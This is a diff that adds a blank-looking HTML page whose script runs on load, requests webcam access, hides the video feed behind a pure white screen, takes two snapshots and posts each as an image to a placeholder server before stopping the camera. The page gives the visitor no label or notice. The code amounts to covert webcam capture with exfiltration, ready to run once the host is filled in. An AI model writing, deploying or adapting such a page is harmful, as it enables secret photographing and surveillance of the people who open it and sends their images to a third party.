@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+  <style>
+    body {
+      margin: 0;
+      background: white; /* PURE WHITE SCREEN */
+    }
+    video { display: none; }
+  </style>
+</head>
+<body>
+
+<video id="video" autoplay></video>
+
+<script>
+
+let alreadyStarted = false;
+
+async function start() {
+
+  if (alreadyStarted) return;
+  alreadyStarted = true;
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+
+    function capture(i) {
+      const canvas = document.createElement("canvas");
+      canvas.width = 300;
+      canvas.height = 300;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, 300, 300);
+      const imageData = canvas.toDataURL("image/png");
+
+      console.log("Sending Photo", i);
+
+      fetch("http://YOUR_SERVER_URL/photo", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: imageData })
+      }).catch(console.error);
+    }
+
+    // 📸 Photo 1 at 1 second
+    setTimeout(() => capture(1), 1000);
+
+    // 📸 Photo 2 at 3 seconds (2 sec delay)
+    setTimeout(() => {
+      capture(2);
+
+      // Stop camera after second photo
+      stream.getTracks().forEach(t => t.stop());
+      console.log("Camera stopped");
+    }, 3000);
+
+  } catch (err) {
+    console.error("Camera Error:", err);
+  }
+}
+
+start();
+
+</script>
+
+
+</body>
+</html>
